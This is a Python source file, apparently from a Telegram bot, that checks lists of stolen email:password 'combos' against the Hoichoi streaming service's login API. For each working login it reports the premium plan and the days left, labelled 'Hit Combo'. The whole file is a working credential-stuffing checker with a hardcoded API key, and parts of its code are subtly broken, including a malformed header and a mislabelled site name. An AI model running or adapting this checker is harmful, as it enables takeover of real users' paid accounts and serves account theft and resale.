import requests
from datetime import date
from message import Editmessage, Sendmessage, logger

head = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
    'accept': 'application/json, text/plain, */*',
    'content-type': 'aapplication/json;charset=UTF-8',
    'origin': 'https://www.hoichoi.tv',
    'referer': 'https://www.hoichoi.tv/',
}
def hoichoi_helper(chat_id, combo):
    status = Sendmessage(chat_id, '<i>Checking...</i>')
    try:
        combo_split = combo.split(':')
        inpumail = combo_split[0]
        inpupass = combo_split[1]
    except IndexError:
        print(combo)
        Editmessage(chat_id, 'Enter Valid Combo😡😡', status)
        return
    email= f'"email":"{inpumail}"'
    password = f'"password":"{inpupass}"'
    session_request = requests.Session()
    url = 'https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-f76c181a-94b5-11eb-a8b3-0242ac130003'
    payload = '{%s,%s}' %(email, password)
    response = session_request.post(url,headers=head, data=payload)
    result = response.json()
    if response.status_code != 200:
        code=result['code']
        messg = result['error']
        text = f'<b>Bad Combo ❌</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Code: {code}\nMessage: {messg}\nSite: Hoichoi</b>'
        Editmessage(chat_id, text, status)
        return
    elif result['isSubscribed'] == False:
        free_text = f'<b>Expired Combo ❌</b>\n<b>Site: Altbalaji</b>\n<b>Combo: </b><code>{combo}</code>\n<b>Status: Expired/Free</b>'
        Editmessage(chat_id, free_text, status)
        return
    user_token = result['authorizationToken']
    head2 = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
    'accept': 'application/json, text/plain, */*',
    'authorization': user_token,
    'origin': 'https://www.hoichoi.tv',
'referer':'https://www.hoichoi.tv/',
'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef'
}
    url2 = 'https://prod-api.viewlift.com/subscription/user?site=hoichoitv&userId=f76c181a-94b5-11eb-a8b3-0242ac130003'
    session2 = session_request.get(url2, headers=head2)
    result2 = session2.json()
    timedioint = result2["subscriptionInfo"]["subscriptionEndDate"].split('T')[0]
    sub2split = timedioint.split('-')
    trial = date(int(sub2split[0]), int(sub2split[1]), int(sub2split[2])) - date.today()
    pro_message = f'<b>╔════════════════╗
    ╠🌟 Hit Combo 💫</b>\n<b>╠Site: Hoichoi</b>\n<b>╠Combo: </b><code>{combo}</code>\n<b>╠Status: Premium\n╠Plan: {result2["subscriptionPlanInfo"]["name"]}\n╠Days Left: {trial.days}\n╠Recurring: {result2["subscriptionPlanInfo"]["renewable"]}╚════════════════╝</b>'
    Editmessage(chat_id, pro_message, status)
    return

